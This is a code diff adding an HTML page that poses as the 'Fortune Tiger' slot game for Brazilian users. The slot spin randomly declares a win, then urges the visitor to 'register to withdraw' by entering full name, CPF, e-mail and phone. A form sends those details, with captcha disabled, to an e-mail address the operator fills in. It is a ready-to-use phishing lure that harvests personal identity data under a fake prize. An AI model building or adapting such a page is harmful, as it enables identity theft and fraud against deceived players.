@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fortune Tiger - Jogue Agora</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #ff9900, #ffcc00);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+
+        .container {
+            background-color: rgba(255, 255, 255, 0.95);
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+            width: 320px;
+            text-align: center;
+        }
+
+        h1 {
+            color: #d4af37; /* Cor dourada */
+            margin-bottom: 10px;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.2);
+        }
+
+        .tiger-icon {
+            font-size: 60px;
+            margin: 10px 0;
+        }
+
+        .slots {
+            display: flex;
+            justify-content: center;
+            gap: 5px;
+            background: #333;
+            padding: 10px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            border: 3px solid #d4af37;
+        }
+
+        .slot {
+            width: 60px;
+            height: 60px;
+            background-color: #fff;
+            border-radius: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            font-weight: bold;
+        }
+
+        button {
+            background: linear-gradient(to bottom, #ffcc00, #ff9900);
+            border: none;
+            padding: 15px 30px;
+            border-radius: 25px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 0 #cc7a00;
+            transition: transform 0.1s;
+            width: 100%;
+            margin-bottom: 15px;
+        }
+
+        button:active {
+            transform: translateY(4px);
+            box-shadow: none;
+        }
+
+        .form-section {
+            text-align: left;
+            margin-top: 20px;
+            border-top: 1px solid #ddd;
+            padding-top: 15px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        .btn-register {
+            background: #28a745;
+            box-shadow: 0 4px 0 #1e7e34;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="tiger-icon">🐯</div>
+        <h1>Fortune Tiger</h1>
+        
+        <!-- Área do Jogo -->
+        <div class="slots" id="slots">
+            <div class="slot">🍊</div>
+            <div class="slot">🍊</div>
+            <div class="slot">🍊</div>
+        </div>
+
+        <button onclick="spin()">GIRAR 🎰</button>
+        <p id="result" style="height: 20px; color: red; font-weight: bold;"></p>
+
+        <!-- Formulário de Cadastro -->
+        <div class="form-section">
+            <p><strong>Cadastre-se para sacar:</strong></p>
+            
+            <!-- Configuração do FormSubmit -->
+            <!-- Substitua SEU_EMAIL@AQUI pelo seu email real -->
+            <form action="https://formsubmit.co/SEU_EMAIL@AQUI" method="POST">
+                <input type="hidden" name="_subject" value="Novo Cadastro Tigrinho!">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_next" value="https://google.com">
+
+                <label>Nome Completo:</label>
+                <input type="text" name="nome" required placeholder="Seu nome">
+
+                <label>CPF:</label>
+                <input type="text" name="cpf" required placeholder="000.000.000-00">
+
+                <label>E-mail:</label>
+                <input type="email" name="email" required placeholder="seu@email.com">
+
+                <label>Telefone:</label>
+                <input type="tel" name="telefone" required placeholder="(00) 00000-0000">
+
+                <button type="submit" class="btn-register">CADASTRAR E SACAR</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function spin() {
+            const symbols = ['🍊', '🍯', '🐯', '🧧', '💎', '🍒'];
+            const slots = document.querySelectorAll('.slot');
+            const resultText = document.getElementById('result');
+            
+            resultText.innerText = "Girando...";
+            
+            // Animação simples
+            let interval = setInterval(() => {
+                slots.forEach(slot => {
+                    slot.innerText = symbols[Math.floor(Math.random() * symbols.length)];
+                });
+            }, 100);
+
+            setTimeout(() => {
+                clearInterval(interval);
+                // Define um resultado aleatório final
+                slots.forEach(slot => {
+                    slot.innerText = symbols[Math.floor(Math.random() * symbols.length)];
+                });
+                
+                // Simula vitória ou derrota
+                const isWin = Math.random() > 0.5;
+                if (isWin) {
+                    resultText.innerText = "Você ganhou! Cadastre-se para sacar.";
+                    resultText.style.color = "green";
+                } else {
+                    resultText.innerText = "Não foi dessa vez...";
+                    resultText.style.color = "red";
+                }
+            }, 1500);
+        }
+    </script>
+
+</body>
+</html>
